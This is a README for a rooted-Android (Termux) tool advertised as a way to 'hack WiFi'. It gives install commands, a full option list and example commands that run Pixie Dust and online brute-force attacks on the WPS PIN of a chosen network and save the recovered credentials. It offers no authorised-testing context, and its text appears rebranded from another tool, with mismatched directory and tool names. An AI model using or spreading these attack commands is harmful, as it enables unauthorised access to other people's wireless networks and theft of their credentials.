## Rox_Fi

### Hack WIfi Using Termux! (Requires Root)

<p align="center"><img src="https://k.top4top.io/p_2825ur3eq0.jpg

### Installation :

```bash

$ apt update && apt upgrade

$ pkg install -y root-repo

$ pkg install -y git tsu python wpa-supplicant pixiewps iw

$ git clone https://github.com/Gtajisan/farhan-wifihack

$ cd farhan

$ chmod +x farhan.py

$ sudo python farhan.py --help

```

# Usage
```
 farhan.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

#### Example : `sudo python farhan.py -i wlan0 -K`

#### Note: ( need root)

**First turn off your Wifi.**

- Show avaliable networks and start Pixie Dust attack on a specified network.

- `sudo python farhan.py -i wlan0 -K`

- - Start Pixie Dust attack on a specified BSSID:

`sudo python farhan.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`

- Launch online WPS bruteforce with the specified first half of the PIN:

- `sudo python farhan.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`

### Troubleshooting

#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running WifiHack with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
## thanks for tools use
## advance thanks my friends 
## ## [Facebook](https://www.facebook.com/profile.php?id=100094924471568&mibextid=ZbWKwL)

## [Whatsapp](https://wa.me/+880130505723*)

## Thanks For Using This Tool 🐸🙄

